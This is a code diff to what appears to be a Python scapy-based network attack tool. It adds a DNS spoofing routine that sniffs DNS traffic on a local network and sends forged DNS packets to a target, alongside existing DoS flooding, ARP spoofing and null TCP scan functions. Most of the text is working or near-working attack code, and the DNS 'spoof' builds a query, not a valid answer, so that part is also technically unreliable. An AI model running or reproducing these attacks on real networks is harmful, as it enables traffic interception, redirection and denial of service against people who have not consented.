@@ -1,13 +1,14 @@
 from scapy.all import *
 import pythonping
+from scapy.layers.dns import DNSQR, DNS
 from scapy.layers.l2 import ARP
-from scapy.layers.inet import TCP, IP
+from scapy.layers.inet import TCP, IP, UDP
 
 from helper import *
 from banner_generator import print_banner
 
 
-def handle_attack(args: list[str]):
+def handle_attack(args: list[str]) -> None:
     args_num = len(args)
     if args_num < 2:
         print('Invalid usage, see "help"')
@@ -33,11 +34,16 @@ def handle_attack(args: list[str]):
                 print('Invalid usage, see "help"')
                 return
             commit_null_tcp_scan(target, *args[2:])
+        case "dns":
+            if args_num != 2:
+                print('Invalid usage, see "help"')
+                return
+            commit_dns_spoofing(target)
         case _:
             print('Attack not supported! Use "help" to learn more')
 
 
-def commit_ddos(target: str):
+def commit_ddos(target: str) -> None:
     print('Committing DoS, press CTRL+C at any moment to stop.')
     try:
         while True:
@@ -50,7 +56,7 @@ def commit_ddos(target: str):
         print("An exception occurred, abandoning attack.")
 
 
-def commit_arp_spoofing(target: str):
+def commit_arp_spoofing(target: str) -> None:
     if not is_local_ip(target):
         print('Invalid use, please enter a private ip')
         return
@@ -71,7 +77,7 @@ def commit_arp_spoofing(target: str):
     sniff(prn=packet_handler, promisc=True, store=False, filter='arp')
 
 
-def commit_null_tcp_scan(target: str, ports: str = "", print_closed: bool = True):
+def commit_null_tcp_scan(target: str, ports: str = "", print_closed: bool = True) -> None:
     try:
         port_list = extract_ports(ports)
     except ValueError:
@@ -107,8 +113,26 @@ def commit_null_tcp_scan(target: str, ports: str = "", print_closed: bool = True
 
         print("└──────┴─────────┘")
     except (KeyboardInterrupt, InterruptedError):
-        print("└──────┴─────────┘")
-        print("\nAttack Terminated.")
+        print("\r└──────┴─────────┘\nAttack Terminated.")
+
+
+def commit_dns_spoofing(target: str) -> None:
+    if not is_local_ip(target):
+        print('Invalid use, please enter a private ip')
+        return
+
+    BAIT_DOMAIN = "google.com"  # Redirects
+    print(f'Committing DNS Spoofing using bait {BAIT_DOMAIN}')
+
+    def packet_handler(packet):
+        if DNS in packet:
+            ip = IP(dst=target, src=LOCAL_IP)
+            udp = UDP(dport=53, sport=53)  # Send back to 53 (UDP) from a spoofed port
+            dns = DNS(rd=1, qd=DNSQR(qname=BAIT_DOMAIN, qtype="A"))  # Send back a spoofed DNS response
+            to_send = ip/udp/dns  # Join all packet layers
+            send(to_send)
+
+    sniff(prn=packet_handler, promisc=True, store=False, filter="udp port 53")
 
 
 # Returns whether to continue or not
